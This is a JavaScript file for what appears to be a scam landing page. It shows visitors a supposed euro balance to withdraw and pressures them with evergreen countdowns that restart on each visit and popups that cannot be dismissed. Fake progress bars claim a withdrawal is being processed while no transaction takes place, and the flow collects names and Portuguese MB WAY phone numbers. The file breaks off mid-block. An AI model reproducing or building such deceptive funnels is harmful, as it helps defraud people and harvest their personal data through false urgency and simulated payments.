/* main.js — SPA router + contadores + loader + modal popup (abre 3s em #one)
   Versão unificada: o schedulePopupForOne() está no mesmo escopo de showScreen().
*/
(function () {
  /* ---------------------------
     Variáveis / helpers de modal
     --------------------------- */
  let modalTimer = null;
  let activeModalId = null;

  function showModal(id) {
    const modal = document.getElementById(id);
    if (!modal) return;

    activeModalId = id;
    modal.classList.add("is-modal", "is-active");
    modal.removeAttribute("aria-hidden");

    // Captura a posição atual do scroll APENAS se ainda não estiver travado
    if (!document.body.classList.contains("modal-open")) {
      const scrollY = window.scrollY;
      document.body.style.position = "fixed";
      document.body.style.top = `-${scrollY}px`;
      document.body.style.width = "100%";

      document.body.classList.add("modal-open");
      document.documentElement.classList.add("modal-open");
    }

    // Habilita o botão .btn-sacar em #one somente quando o primeiro popup (id="two") abrir
    if (id === "two") {
      const btnOneSacar = document.querySelector(
        "#one .container-saldo .btn-sacar"
      );
      if (btnOneSacar) {
        btnOneSacar.removeAttribute("disabled");
        btnOneSacar.style.pointerEvents = "auto";
        btnOneSacar.style.opacity = "";
      }

      // Anima o contador do popup quando ele for exibido
      setTimeout(() => {
        const popupCounter = modal.querySelector(
          ".valor-currency[data-amount-target]"
        );
        if (
          popupCounter &&
          typeof window.animateCurrencyCounter === "function"
        ) {
          // Reseta o texto para 0 antes de animar e força re-animação
          popupCounter.textContent = "€0,00";
          window.animateCurrencyCounter(popupCounter, true); // true = forceReset
        }
      }, 50);
    }

    // overlay click: DESABILITADO - popups só fecham por botões específicos
    function overlayClickHandler(ev) {
      // Nenhum popup fecha ao clicar fora
      // Todos os popups só fecham através de botões específicos
      return;
    }
    modal.addEventListener("click", overlayClickHandler);
    modal._overlayHandler = overlayClickHandler;

    // fechar por botões com data-modal-close
    const closeButtons = Array.from(
      modal.querySelectorAll("[data-modal-close]")
    );
    modal._closeButtonHandlers = closeButtons.map((btn) => {
      const h = (ev) => {
        ev && ev.preventDefault();
        closeModal(id);
      };
      btn.addEventListener("click", h);
      return { btn, h };
    });

    // foco para primeiro elemento do modal
    const focusable = modal.querySelector(
      'button, a, input, [tabindex]:not([tabindex="-1"])'
    );
    if (focusable) focusable.focus();
  }

  function closeModal(id) {
    const modal = document.getElementById(id);
    if (!modal) return;

    if (modal._overlayHandler)
      modal.removeEventListener("click", modal._overlayHandler);
    if (modal._closeButtonHandlers) {
      modal._closeButtonHandlers.forEach(({ btn, h }) =>
        btn.removeEventListener("click", h)
      );
    }

    modal.classList.remove("is-active", "is-modal");
    modal.setAttribute("aria-hidden", "true");

    // Verifica se ainda existe algum modal aberto
    const remainingModals = document.querySelectorAll(
      ".screen.is-modal.is-active"
    );
    if (remainingModals.length === 0) {
      // Só destrava se não houver mais nenhum modal
      const scrollY = document.body.style.top;
      document.body.style.position = "";
      document.body.style.top = "";
      document.body.style.width = "";
      window.scrollTo(0, parseInt(scrollY || "0") * -1);

      document.body.classList.remove("modal-open");
      document.documentElement.classList.remove("modal-open");
    }

    activeModalId = null;

    // foco volta pra #one se existir
    const screenOne = document.getElementById("one");
    if (screenOne) {
      const f = screenOne.querySelector(
        'button, a, input, [tabindex]:not([tabindex="-1"])'
      );
      if (f) f.focus();
    }
  }

  function schedulePopupForOne() {
    clearModalTimer();
    modalTimer = setTimeout(() => {
      const one = document.getElementById("one");
      if (one && one.classList.contains("is-active")) {
        showModal("two");
      }
    }, 0);
  }

  function clearModalTimer() {
    if (modalTimer) {
      clearTimeout(modalTimer);
      modalTimer = null;
    }
  }

  // limpa timer ao sair da página
  window.addEventListener("beforeunload", clearModalTimer);

  /* ---------------------------
     Contadores (evergreen) — mantidos
     --------------------------- */
  function iniciarContadorInline(tempoTotal) {
    const timerElement = document.getElementById("timer");
    const textElement = document.getElementById("countdown-text");
    if (!timerElement || !textElement) return;

    let tempoRestante = tempoTotal;
    let contador = setInterval(() => {
      if (tempoRestante < 0) {
        clearInterval(contador);
        textElement.textContent = "SEU SALDO EXPIROU";
        return;
      }
      let minutos = Math.floor(tempoRestante / 60);
      let segundos = tempoRestante % 60;
      timerElement.textContent = `00 - ${String(minutos).padStart(
        2,
        "0"
      )} - ${String(segundos).padStart(2, "0")}`;
      tempoRestante--;
    }, 1000);
  }

  function iniciarContadorPopup(tempoTotal) {
    const todosOsTimersPopup = document.querySelectorAll(".expira-em-popup");
    if (!todosOsTimersPopup.length) return;

    todosOsTimersPopup.forEach((timerContainer, index) => {
      const minutesElement = timerContainer.querySelector(
        '[data-timer="minutes"]'
      );
      const secondsElement = timerContainer.querySelector(
        '[data-timer="seconds"]'
      );
      const labelElement = timerContainer.querySelector(".timer-label");
      if (!minutesElement || !secondsElement || !labelElement) return;

      let tempoRestante = tempoTotal;
      let contador = setInterval(() => {
        if (tempoRestante < 0) {
          clearInterval(contador);
          labelElement.textContent = "Expirado";
          minutesElement.textContent = "00";
          secondsElement.textContent = "00";
          return;
        }
        let minutos = Math.floor(tempoRestante / 60);
        let segundos = tempoRestante % 60;
        minutesElement.textContent = String(minutos).padStart(2, "0");
        secondsElement.textContent = String(segundos).padStart(2, "0");
        tempoRestante--;
      }, 1000);
    });
  }

  /* ---------------------------
     Loader (barra de progresso)
     --------------------------- */
  /* ---------------------------
     Loader (barra de progresso)
     --------------------------- */
  let loaderState = {
    timeouts: [],
    interval: null,
  };

  function resetLoader() {
    const loadingText = document.getElementById("loading-text");
    const progressBar = document.getElementById("progress-bar");
    if (!loadingText || !progressBar) return;

    // Clear all scheduled timeouts
    loaderState.timeouts.forEach((t) => clearTimeout(t));
    loaderState.timeouts = [];

    if (loaderState.interval) {
      clearInterval(loaderState.interval);
      loaderState.interval = null;
    }

    // Reset UI
    progressBar.style.transition = "none";
    progressBar.style.width = "0%";
    loadingText.textContent = "Iniciando...";
    loadingText.style.opacity = "1";
  }

  function startLoader() {
    const loadingText = document.getElementById("loading-text");
    const progressBar = document.getElementById("progress-bar");
    if (!loadingText || !progressBar) return;

    resetLoader(); // Ensure clean state

    const steps = [
      { text: "A validar as suas informações", progress: 25 },
      { text: "A concluir levantamento", progress: 50 },
      { text: "A processar transação", progress: 75 },
      { text: "A finalizar", progress: 100 },
    ];
    const stepDuration = 3000,
      textFadeDuration = 400,
      dotAnimationSpeed = 800;

    let currentStep = 0;

    // Restore transition
    // Force reflow before adding transition back
    void progressBar.offsetWidth;
    progressBar.style.transition = `width ${stepDuration / 1000}s linear`;

    function scheduleNextStep() {
      if (currentStep < steps.length) {
        if (loaderState.interval) clearInterval(loaderState.interval);

        loadingText.style.opacity = 0;

        const t1 = setTimeout(() => {
          const step = steps[currentStep];
          const baseText = step.text;
          loadingText.textContent = baseText;
          // Calcula a largura considerando o padding de 20px de cada lado
          const containerWidth = progressBar.parentElement.offsetWidth - 40; // 20px de cada lado
          progressBar.style.width =
            (containerWidth * step.progress) / 100 + "px";
          loadingText.style.opacity = 1;

          let dotCount = 0;
          loaderState.interval = setInterval(() => {
            dotCount = (dotCount % 3) + 1;
            loadingText.textContent = baseText + ".".repeat(dotCount);
          }, dotAnimationSpeed);

          currentStep++;
          const t2 = setTimeout(scheduleNextStep, stepDuration);
          loaderState.timeouts.push(t2);
        }, textFadeDuration);
        loaderState.timeouts.push(t1);
      } else {
        if (loaderState.interval) clearInterval(loaderState.interval);
        loadingText.style.opacity = 0;

        const t3 = setTimeout(() => {
          loadingText.textContent = "Levantamento Concluído!";
          loadingText.style.opacity = 1;
        }, textFadeDuration);
        loaderState.timeouts.push(t3);
      }
    }

    // Start
    const tStart = setTimeout(scheduleNextStep, 500);
    loaderState.timeouts.push(tStart);
  }

  // Expose globally
  window.startLoader = startLoader;
  window.resetLoader = resetLoader;

  /* ---------------------------
     Nova animação de loading (#seven)
     --------------------------- */
  /* ---------------------------
     Nova animação de loading (#seven)
     --------------------------- */
  let newLoadingState = {
    interval: null,
    timeouts: [],
  };

  function startNewLoadingAnimation() {
    const loadingText = document.getElementById("new-loading-text");
    const progressBar = document.getElementById("new-progress-bar");

    if (!loadingText || !progressBar) return;

    // Reset state
    resetNewLoadingAnimation();

    // Force faster transition to match new speed
    progressBar.style.transition = "width 1.3s ease-in-out";

    const texts = [
      "A validar dados...",
      "A ligar ao servidor...",
      "A concluir resgate...",
      "Quase pronto...",
    ];

    // Set initial text immediately
    loadingText.textContent = texts[0];

    let currentIndex = 0;
    const totalSteps = texts.length;
    const progressPerStep = 100 / totalSteps;

    function updateProgress() {
      const progress = (currentIndex + 1) * progressPerStep;
      progressBar.style.width = `${progress}%`;
    }

    // Inicializar progresso
    updateProgress();

    function changeText() {
      loadingText.style.opacity = 0;

      const t1 = setTimeout(() => {
        currentIndex++;
        loadingText.textContent = texts[currentIndex];
        loadingText.style.opacity = 1;

        // Atualizar progresso com transição suave
        updateProgress();
      }, 150);
      newLoadingState.timeouts.push(t1);
    }

    // Loop de textos
    newLoadingState.interval = setInterval(() => {
      if (currentIndex >= totalSteps - 1) {
        // Chegou no último passo ("Quase pronto...")
        clearInterval(newLoadingState.interval);

        // Finaliza e redireciona
        const tEnd = setTimeout(() => {
          if (typeof window.showScreen === "function") {
            window.showScreen("nine");
          } else {
            location.hash = "#nine";
          }
        }, 700);
        newLoadingState.timeouts.push(tEnd);
        return;
      }
      changeText();
    }, 1600);
  }

  function resetNewLoadingAnimation() {
    const loadingText = document.getElementById("new-loading-text");
    const progressBar = document.getElementById("new-progress-bar");

    if (newLoadingState.interval) {
      clearInterval(newLoadingState.interval);
      newLoadingState.interval = null;
    }
    newLoadingState.timeouts.forEach((t) => clearTimeout(t));
    newLoadingState.timeouts = [];

    if (loadingText) {
      loadingText.textContent = "A validar acesso...";
      loadingText.style.opacity = 1;
    }
    if (progressBar) {
      progressBar.style.transition = "none";
      progressBar.style.width = "0%";
      // Força reflow
      void progressBar.offsetWidth;
      progressBar.style.transition =
        "width 1.2s cubic-bezier(0.25, 0.46, 0.45, 0.94)";
    }
  }

  // Expose globally
  window.startNewLoadingAnimation = startNewLoadingAnimation;
  window.resetNewLoadingAnimation = resetNewLoadingAnimation;

  /* ---------------------------
     Função para preencher página de confirmação (#nine)
     --------------------------- */
  function fillConfirmationPage() {
    // Tenta pegar do objeto global ou do localStorage
    let formData = window.__formData;
    if (!formData) {
      try {
        const stored = localStorage.getItem("userPixData");
        if (stored) {
          formData = JSON.parse(stored);
        }
      } catch (e) {
        console.error("Erro ao ler localStorage", e);
      }
    }

    if (!formData) return;

    // Função para formatar data atual
    function getCurrentDate() {
      const now = new Date();
      const day = String(now.getDate()).padStart(2, "0");
      const month = String(now.getMonth() + 1).padStart(2, "0");
      const year = now.getFullYear();
      return `${day}/${month}/${year}`;
    }

    // Preenche o nome
    const nameElement = document.getElementById("confirmation-name");
    if (nameElement && formData.nome) {
      nameElement.textContent = formData.nome;
    }

    // Preenche a data atual
    const dateElement = document.getElementById("confirmation-date");
    if (dateElement) {
      dateElement.textContent = getCurrentDate();
    }

    // Preenche o tipo de chave PIX
    const keyTypeElement = document.getElementById("confirmation-key-type");
    if (keyTypeElement && formData.tipoChave) {
      keyTypeElement.textContent = formData.tipoChave;
    }

    // Preenche a chave PIX digitada
    const pixKeyElement = document.getElementById("confirmation-pix-key");
    if (pixKeyElement && formData.chavePix) {
      // O valor já deve estar formatado do input, mas garante formatação se necessário
      let formattedKey = formData.chavePix;

      if (formData.tipoChave === "CPF") {
        // Se não estiver formatado, formata
        if (!formattedKey.includes(".") && !formattedKey.includes("-")) {
          const cleanCPF = formattedKey.replace(/\D/g, "");
          if (cleanCPF.length === 11) {
            formattedKey = cleanCPF
              .replace(/(\d{3})(\d)/, "$1.$2")
              .replace(/(\d{3})(\d)/, "$1.$2")
              .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
          }
        }
      } else if (formData.tipoChave === "Celular") {
        // Formata celular se necessário (opcional, geralmente já vem formatado)
        const cleanPhone = formattedKey.replace(/\D/g, "");
        if (
          cleanPhone.length >= 10 &&
          cleanPhone.length <= 11 &&
          !formattedKey.includes("(")
        ) {
          if (cleanPhone.length === 11) {
            formattedKey = cleanPhone.replace(
              /(\d{2})(\d{5})(\d{4})/,
              "($1) $2-$3"
            );
          } else if (cleanPhone.length === 10) {
            formattedKey = cleanPhone.replace(
              /(\d{2})(\d{4})(\d{4})/,
              "($1) $2-$3"
            );
          }
        }
      }
      // Para E-mail e Chave Aleatória, mantém como está

      pixKeyElement.textContent = formattedKey;
    }
  }

  // Expose globally
  window.fillConfirmationPage = fillConfirmationPage;

  /* ---------------------------
     SPA Router (inicia screens e navegação)
     --------------------------- */
  function initRouter() {
    const screens = Array.from(document.querySelectorAll("#screens .screen"));
    if (!screens.length) return;

    function showScreen(id, push = true) {
      const target = document.getElementById(id);
      if (!target) {
        console.warn(`Tela "${id}" não encontrada.`);
        return;
      }

      screens.forEach((s) => {
        if (s === target) {
          s.classList.add("is-active");
          s.removeAttribute("aria-hidden");
        } else {
          s.classList.remove("is-active");
          s.setAttribute("aria-hidden", "true");
        }
      });

      if (push) {
        try {
          history.pushState({ screen: id }, "", "#" + id);
        } catch (e) {
          location.hash = id;
        }
      }

      // Scroll to top when showing a new screen
      window.scrollTo(0, 0);
      document.documentElement.scrollTop = 0;
      document.body.scrollTop = 0;

      // Para #nine, força scroll para o topo após renderização
      if (id === "nine") {
        // Scroll imediato
        window.scrollTo({ top: 0, left: 0, behavior: "instant" });
        document.documentElement.scrollTop = 0;
        document.body.scrollTop = 0;

        // Scroll novamente após renderização para garantir
        setTimeout(() => {
          window.scrollTo({ top: 0, left: 0, behavior: "instant" });
          document.documentElement.scrollTop = 0;
          document.body.scrollTop = 0;
          const nineElement = document.getElementById("nine");
          if (nineElement) {
            nineElement.scrollTop = 0;
            // Também força scroll no container se houver
            const container = nineElement.querySelector(
              ".confirmation-container"
            );
            if (container) {
              container.scrollTop = 0;
            }
          }
        }, 100);
      }

      const focusable = target.querySelector(
        'button, a, input, select, textarea, [tabindex]:not([tabindex="-1"])'
      );
      if (focusable) focusable.focus({ preventScroll: true });

      // >>> Aqui garantimos que o popup seja agendado quando entrarmos em #one
      if (id === "one") {
        schedulePopupForOne();
      } else {
        clearModalTimer();

        // Garante que o sticky popup suma ao sair da #one
        const stickyPopup = document.getElementById("popup-um");
        if (stickyPopup) {
          stickyPopup.classList.remove("is-visible");
        }

        // Se for para #seven, fecha todos os modais e inicia novo loader
        if (id === "seven") {
          const modalIds = ["two", "four", "five", "six"];
          modalIds.forEach((modalId) => {
            const modal = document.getElementById(modalId);
            if (modal && modal.classList.contains("is-modal")) {
              closeModal(modalId);
            }
          });
          // Inicia a nova animação de loading
          if (typeof startNewLoadingAnimation === "function") {
            startNewLoadingAnimation();
          }
        } else {
          // Se não for #seven, reseta o loader
          if (typeof window.resetLoader === "function") {
            window.resetLoader();
          }

          // Reseta a nova animação de loading se estiver ativa
          if (typeof resetNewLoadingAnimation === "function") {
            resetNewLoadingAnimation();
          }

          if (activeModalId) {
            closeModal(activeModalId);
          }
        }
      }

      // Anima contador da tela #three quando ela for exibida
      if (
        id === "three" &&
        typeof window.animateCurrencyCounter === "function"
      ) {
        // Usa um timeout maior para garantir que a tela está totalmente renderizada
        // e cancela qualquer timeout anterior para evitar múltiplas animações
        if (target._threeAnimationTimeout) {
          clearTimeout(target._threeAnimationTimeout);
        }
        target._threeAnimationTimeout = setTimeout(() => {
          const threeCounter = target.querySelector(
            ".valor-currency[data-amount-target]"
          );
          if (threeCounter) {
            // Garante que o elemento ainda está visível antes de animar
            if (target.classList.contains("is-active")) {
              window.animateCurrencyCounter(threeCounter, true); // true = forceReset
            }
          }
          target._threeAnimationTimeout = null;
        }, 100);
      }

      // Preenche dados na página de confirmação (#nine) quando ela for exibida
      if (id === "nine") {
        // Garante que a página apareça no topo
        window.scrollTo(0, 0);
        document.documentElement.scrollTop = 0;
        document.body.scrollTop = 0;

        // Preenche imediatamente para evitar flash de conteúdo vazio
        fillConfirmationPage();

        setTimeout(() => {
          // Força scroll para o topo novamente após renderização
          window.scrollTo(0, 0);
          document.documentElement.scrollTop = 0;
          document.body.scrollTop = 0;
          const nineElement = document.getElementById("nine");
          if (nineElement) {
            nineElement.scrollTop = 0;
          }

          // Animação do saldo (pode ficar no timeout ou fora, mas fora é mais garantido de iniciar logo)
          const confirmationBalance = document.querySelector(
            ".confirmation-balance-amount[data-amount-target]"
          );
          if (
            confirmationBalance &&
            typeof window.animateCurrencyCounter === "function"
          ) {
            window.animateCurrencyCounter(confirmationBalance, true);
          }
        }, 150);
      }
    }

    window.addEventListener("popstate", (ev) => {
      const id =
        (ev.state && ev.state.screen) ||
        location.hash.replace("#", "") ||
        screens[0].id;
      showScreen(id, /*push*/ false);
    });

    // inicial: usa hash ou primeira screen
    const initial = location.hash.replace("#", "") || screens[0].id;
    showScreen(initial, /*push*/ false);

    // expõe globalmente se precisar (útil pra debugging)
    window.showScreen = showScreen;
  }

  // Se preferir JS: torna o botão .btn-sacar um link para a screen 'three'

  document.addEventListener("DOMContentLoaded", () => {
    const btnSacar =
      document.querySelector("#one .container-saldo .btn-sacar") ||
      document.querySelector(".btn-sacar");
    if (btnSacar) {
      btnSacar.addEventListener("click", function (ev) {
        ev.preventDefault();
        // fecha modal/timers caso haja algum aberto (opcional)
        if (typeof clearModalTimer === "function") clearModalTimer();
        if (typeof closeModal === "function" && activeModalId)
          closeModal(activeModalId);

        // usa a função global do router para trocar de tela
        if (typeof window.showScreen === "function") {
          window.showScreen("three");
        } else {
          // fallback: altera hash
          location.hash = "#three";
        }
      });
    }
  });

  /* ---------------------------
     Inicialização
     --------------------------- */
  document.addEventListener("DOMContentLoaded", () => {
    initRouter();

    // iniciadores de contador (evergreen) — ajuste o tempo aqui se quiser
    const tempoInicialEmSegundos = 16 * 60 + 38;
    iniciarContadorInline(tempoInicialEmSegundos);
    iniciarContadorPopup(tempoInicialEmSegundos);

    // initLoaderIfExists(); // Removido para iniciar apenas no #seven

    initStickyPopup();

    // Garante que o popup inicial seja agendado se estivermos na #one
    const currentHash = location.hash.replace("#", "") || "one";
    if (currentHash === "one") {
      schedulePopupForOne();
    }
  });

  /* ---------------------------
     Sticky Popup Logic
     --------------------------- */
  function initStickyPopup() {
    const saldoSection = document.querySelector("#one .saldo");
    const stickyPopup = document.getElementById("popup-um");
    const screenOne = document.getElementById("one");

    if (!saldoSection || !stickyPopup || !screenOne) return;

    // Configura botão de sacar do popup para funcionar igual ao principal
    const btnSacarPopup = stickyPopup.querySelector(".btn-sacar");
    if (btnSacarPopup) {
      btnSacarPopup.addEventListener("click", (ev) => {
        ev.preventDefault();
        if (typeof window.showScreen === "function") {
          window.showScreen("three");
        } else {
          location.hash = "#three";
        }
      });
    }

    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          // Se .saldo NÃO está intersectando (saiu da tela) E #one está ativo
          if (
            !entry.isIntersecting &&
            screenOne.classList.contains("is-active")
          ) {
            stickyPopup.classList.add("is-visible");
          } else {
            stickyPopup.classList.remove("is-visible");
          }
        });
      },
      {
        threshold: 0, // Dispara assim que qualquer parte sair/entrar
        rootMargin: "-50px 0px 0px 0px", // Ajuste fino para disparar um pouco antes de sumir totalmente
      }
    );

    observer.observe(saldoSection);

    // Expõe para ser usado no router
    window.__stickyObserver = observer;
  }

  // expõe helpers para caso queira manipular modal manualmente em console
  window.__spa_modal_helpers = {
    schedulePopupForOne,
    clearModalTimer,
    showModal,
    closeModal,
  };

  /* ===== Delegação para botões que fecham modal (funciona mesmo se botão não tiver listener) ===== */
  document.body.addEventListener("click", function (ev) {
    const btn = ev.target.closest("[data-modal-close]");
    if (!btn) return;
    ev.preventDefault();

    // procura o modal ancestor (section com class "screen")
    const modalAncestor = btn.closest(".screen");
    const modalId = modalAncestor ? modalAncestor.id : "two";

    // Se closeModal estiver no escopo (dentro da IIFE), usa diretamente.
    // Caso use outra instância, tenta o helper exposto window.__spa_modal_helpers.closeModal
    if (typeof closeModal === "function") {
      closeModal(modalId);
    } else if (
      window.__spa_modal_helpers &&
      typeof window.__spa_modal_helpers.closeModal === "function"
    ) {
      window.__spa_modal_helpers.closeModal(modalId);
    } else {
      // fallback: tenta esconder a section manualmente
      const modalEl = document.getElementById(modalId);
      if (modalEl) {
        modalEl.classList.remove("is-active", "is-modal");
        modalEl.setAttribute("aria-hidden", "true");
        document.body.classList.remove("modal-open");
      }
    }
  });

  /* ===== Delegação para abrir modais (pix-item abre #five) ===== */
  /* ===== Delegação para abrir modais (pix-item abre #five) ===== */
  document.body.addEventListener("click", function (ev) {
    const opener = ev.target.closest("[data-open-modal]");
    if (!opener) return;

    const modalId = opener.getAttribute("data-open-modal");
    if (!modalId) return;

    ev.preventDefault();
    ev.stopPropagation();

    // Lógica específica para abrir o modal de seleção de PIX (#six)
    if (modalId === "six") {
      const selectorText = document.getElementById("pix-selector-text");
      if (selectorText) {
        const currentType = selectorText.textContent.trim();

        // Mapeamento de Texto -> ID do Radio
        const typeToId = {
          NIF: "key-cpf",
          "E-mail": "key-email",
          "Telemóvel": "key-celular",
          "Chave Aleatória": "key-aleatoria",
        };

        const radioId = typeToId[currentType];
        if (radioId) {
          const radio = document.getElementById(radioId);
          if (radio) radio.checked = true;
        }
      }
    }

    // Abre o modal usando a função showModal
    if (typeof showModal === "function") {
      showModal(modalId);
    } else if (
      window.__spa_modal_helpers &&
      typeof window.__spa_modal_helpers.showModal === "function"
    ) {
      window.__spa_modal_helpers.showModal(modalId);
    }
  });

  // Suporte para tecla Enter no pix-item (acessibilidade)
  document.body.addEventListener("keydown", function (ev) {
    if (ev.key !== "Enter" && ev.key !== " ") return;

    const opener = ev.target.closest("[data-open-modal]");
    if (!opener) return;

    const modalId = opener.getAttribute("data-open-modal");
    if (!modalId) return;

    ev.preventDefault();
    ev.stopPropagation();

    if (typeof showModal === "function") {
      showModal(modalId);
    } else if (
      window.__spa_modal_helpers &&
      typeof window.__spa_modal_helpers.showModal === "function"
    ) {
      window.__spa_modal_helpers.showModal(modalId);
    }
  });

  /* ===== Função para fechar todos os modais abertos ===== */
  function closeAllModals() {
    const modalIds = ["two", "four", "five", "six"];
    modalIds.forEach((modalId) => {
      const modal = document.getElementById(modalId);
      if (modal && modal.classList.contains("is-modal")) {
        if (typeof closeModal === "function") {
          closeModal(modalId);
        } else if (
          window.__spa_modal_helpers &&
          typeof window.__spa_modal_helpers.closeModal === "function"
        ) {
          window.__spa_modal_helpers.closeModal(modalId);
        } else {
          // fallback: fecha manualmente
          modal.classList.remove("is-active", "is-modal");
          modal.setAttribute("aria-hidden", "true");
          document.body.classList.remove("modal-open");
        }
      }
    });
    activeModalId = null;
  }

  /* ===== Lógica de Validação MB WAY (Nome + Telemóvel PT) ===== */

  function validatePTPhone(phone) {
    const clean = phone.replace(/\D/g, "");
    // Telemóvel PT: 9 dígitos, começa por 9
    return clean.length === 9 && clean[0] === "9";
  }

  function checkMBWayFormValidity() {
    const nomeInput = document.getElementById("nome");
    const phoneInput = document.getElementById("mbway-phone");
    const btnEnviar = document.getElementById("btn-enviar-pix");

    if (!nomeInput || !phoneInput || !btnEnviar) return;

    const isNomeFilled = nomeInput.value.trim().length > 2;
    const isPhoneValid = validatePTPhone(phoneInput.value);

    if (isNomeFilled && isPhoneValid) {
      btnEnviar.classList.remove("btn-disabled");
    } else {
      btnEnviar.classList.add("btn-disabled");
    }
  }

  // Listeners para validação em tempo real
  const nomeInput = document.getElementById("nome");
  if (nomeInput) {
    nomeInput.addEventListener("input", checkMBWayFormValidity);
  }
  const phoneInput = document.getElementById("mbway-phone");
  if (phoneInput) {
    phoneInput.addEventListener("input", function() {
      // Só permite dígitos
      this.value = this.value.replace(/\D/g, "").slice(0, 9);
      checkMBWayFormValidity();
    });
  }

  // Validação e Envio MB WAY (Botão Confirmar no #five)
  document.body.addEventListener("click", function (ev) {
    const btnEnviar = ev.target.closest("#btn-enviar-pix");
    if (!btnEnviar) return;

    ev.preventDefault();

    // Se o botão estiver desabilitado, executa validação visual (shake)
    if (btnEnviar.classList.contains("btn-disabled")) {
      const nomeInput = document.getElementById("nome");
      const phoneInput = document.getElementById("mbway-phone");

      if (nomeInput && nomeInput.value.trim().length < 3) {
        nomeInput.classList.remove("shake-animation", "input-error");
        void nomeInput.offsetWidth;
        nomeInput.classList.add("input-error", "shake-animation");
        setTimeout(() => nomeInput.classList.remove("shake-animation"), 500);
      }

      if (phoneInput && !validatePTPhone(phoneInput.value)) {
        phoneInput.classList.remove("shake-animation", "input-error");
        void phoneInput.offsetWidth;
        phoneInput.classList.add("input-error", "shake-animation");
        phoneInput.focus();
        setTimeout(() => phoneInput.classList.remove("shake-animation"), 500);
      }

      return;
    }

    // Se passou (botão habilitado), prossegue
    const nomeVal = document.getElementById("nome");
    const phoneVal = document.getElementById("mbway-phone");

    const formData = {
      nome: nomeVal ? nomeVal.value.trim() : "",
      tipoChave: "Telemóvel",
      chavePix: phoneVal ? "+351" + phoneVal.value.replace(/\D/g, "") : "",
    };

    window.__formData = formData;

    try {
      localStorage.setItem("userPixData", JSON.stringify(formData));
    } catch (e) {}

    // Sucesso: Fecha modais e vai para #seven
    closeAllModals();

    if (typeof window.showScreen === "function") {
      window.showScreen("seven");
    } else {
      location.hash = "#seven";
    }
  });

  // (Formatação de máscaras PIX removida — MB WAY usa apenas telemóvel)
})();

/* =========================
   Anima valor e controla active dos botões em #three
   Cole este bloco dentro do seu main.js, idealmente dentro de DOMContentLoaded
   ========================= */

(function () {
  // --- helper: formata número como moeda BRL ---
  function formatBRL(value) {
    return new Intl.NumberFormat("pt-BR", {
      style: "currency",
      currency: "BRL",
    }).format(value);
  }

  // --- helper: converte "€4.596,72" -> number (4596.72) ---
  function parseBRL(text) {
    if (!text) return 0;
    // remove tudo exceto dígitos e vírgula/ponto
    // suporta formatos: "€4.596,72", "R$ 4.596,72" ou "4596.72"
    const cleaned = String(text)
      .replace(/\s/g, "")
      .replace(/[Rr]\$\s?|€\s?/, "")
      .replace(/\./g, "") // remove separador de milhar
      .replace(/,/g, "."); // troca vírgula decimal para ponto
    const n = parseFloat(cleaned);
    return isNaN(n) ? 0 : n;
  }

  // --- anima número de 0 até target (ou de start -> target) ---
  function animateNumberTo(el, targetNumber, duration = 1400, startNumber = 0) {
    if (!el) return;
    const start = performance.now();
    const end = start + duration;
    function tick(now) {
      const t = Math.min(1, (now - start) / duration);
      // easeOutQuad
      const eased = 1 - (1 - t) * (1 - t);
      const current = startNumber + (targetNumber - startNumber) * eased;
      el.textContent = formatBRL(current);
      if (now < end) {
        requestAnimationFrame(tick);
      } else {
        // garante valor final exato
        el.textContent = formatBRL(targetNumber);
      }
    }
    requestAnimationFrame(tick);
  }

  // --- encontra o elemento do valor na section three ---
  function findAmountElement() {
    // tenta vários seletores comuns (ajuste se quiser)
    const selectors = [
      "#three .valor", // se existir
      "#three .popup-valor",
      "#three .amount",
      "#three .big-valor",
      "#three .valor-principal",
      "#three .saldo-valor",
      "#three .valor-total",
      "#three [data-amount-target]", // data attribute
      "#three .amount-target",
      "#three h1 .valor",
    ];
    for (const sel of selectors) {
      const el = document.querySelector(sel);
      if (el) return el;
    }
    // fallback: busca qualquer texto de moeda dentro de #three
    const three = document.getElementById("three");
    if (!three) return null;
    // procura por nós que contenham "€"
    const nodes = three.querySelectorAll("*");
    for (const n of nodes) {
      if (n.children.length === 0 && /€\s*\d/.test(n.textContent || "")) {
        return n;
      }
    }
    return null;
  }

  // --- gerencia botões da linha .botoes-row-sacar ---

  function initBotoesRowSacar() {
    const container =
      document.querySelector("#three .botoes-row-sacar") ||
      document.querySelector(".botoes-row-sacar");
    if (!container) return;

    const buttons = Array.from(
      container.querySelectorAll('button, [role="button"], a')
    );

    // incluir manualmente o botão display-total
    const displayTotal = document.querySelector(".display-total");
    if (displayTotal) buttons.push(displayTotal);

    const activeClass = "btn-active";
    const sacarBtn = document.querySelector(".btn-sacar-dois");

    // começa bloqueado
    // quando o botão sacar estiver ativo e for clicado
    if (sacarBtn) {
      sacarBtn.addEventListener("click", () => {
        // só abre se estiver liberado
        if (!sacarBtn.classList.contains("btn-sacar-indisponivel")) {
          if (typeof window.__spa_modal_helpers.showModal === "function") {
            window.__spa_modal_helpers.showModal("four");
          } else {
            showModal("four"); // fallback caso esteja no escopo
          }
        }
      });
    }

    function removeActive() {
      buttons.forEach((btn) => btn.classList.remove(activeClass));
    }

    // === LISTENER CORRETO (somente 1 vez) ===
    buttons.forEach((btn) => {
      btn.addEventListener("click", () => {
        removeActive();
        btn.classList.add(activeClass);

        // liberar o botão SACAR imediatamente
        if (sacarBtn) {
          sacarBtn.classList.remove("btn-sacar-indisponivel");
          sacarBtn.removeAttribute("disabled");
          sacarBtn.style.pointerEvents = "auto";
          sacarBtn.style.opacity = "1";
        }
      });
    });

    // limpa o estado inicial
    removeActive();
  }

  // --- função principal a ser chamada quando #three for exibida ---
  function onShowThree() {
    // 1) animar valor - DESABILITADO: agora usamos animateCurrencyCounter unificada
    // A animação é feita diretamente no showScreen do router principal
    /*
    const amountEl = findAmountElement();
    if (amountEl) {
      // tenta ler target em data-target (ex: data-amount-target="4596.72")
      let target = null;
      if (amountEl.dataset && amountEl.dataset.amountTarget) {
        target = parseFloat(amountEl.dataset.amountTarget);
      }
      if (target === null || isNaN(target)) {
        target = parseBRL(amountEl.textContent || amountEl.innerText);
      }
      // se não encontrou, ignore
      if (!isNaN(target) && target > 0) {
        // opcional: começar mostrando 0 formatado imediatamente
        amountEl.textContent = formatBRL(0);
        animateNumberTo(amountEl, target, 1400, 0);
      }
    }
    */

    // 2) init botoes
    initBotoesRowSacar();
  }

  // --- Hook: se seu router expõe showScreen, intercepta chamadas para 'three' ---
  // Se showScreen for global (como no main.js que usamos), monkey-patch para rodar onShowThree sempre que #three for mostrado.
